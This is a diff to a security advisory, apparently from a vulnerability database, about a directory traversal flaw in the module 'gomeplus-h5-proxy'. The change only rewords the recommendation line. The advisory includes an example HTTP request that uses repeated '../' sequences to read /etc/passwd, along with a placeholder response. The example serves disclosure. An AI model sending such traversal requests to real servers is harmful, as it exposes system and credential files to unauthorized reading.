@@ -17,7 +17,7 @@ Schema-Version: '1.0'
 SPDX-License-Identifier: CC-BY-4.0
 ---
 ### Summary
-*Directory Traversal*<br><br>Because there is no fix for this module, we suggest using a different one.
+*Directory Traversal*<br><br>Recommendation: Because there is no fix for this module, we suggest using a different one.
 ### Details
 `gomeplus-h5-proxy` is vulnerable to a directory traversal issue, allowing attackers to access any file in the system by placing '../' in the URL.  Example request: ``` GET /../../../../../../../../../../../../../../../etc/passwd HTTP/1.1 host: localhost ``` and response: ``` HTTP/1.1 200 OK Access-Control-Allow-Origin: * Date: Mon, 22 May 2017 21:29:51 GMT Connection: keep-alive Transfer-Encoding: chunked  {contents of /etc/passwd} ```
 <br><br>• Affected Versions: <99.999.9999
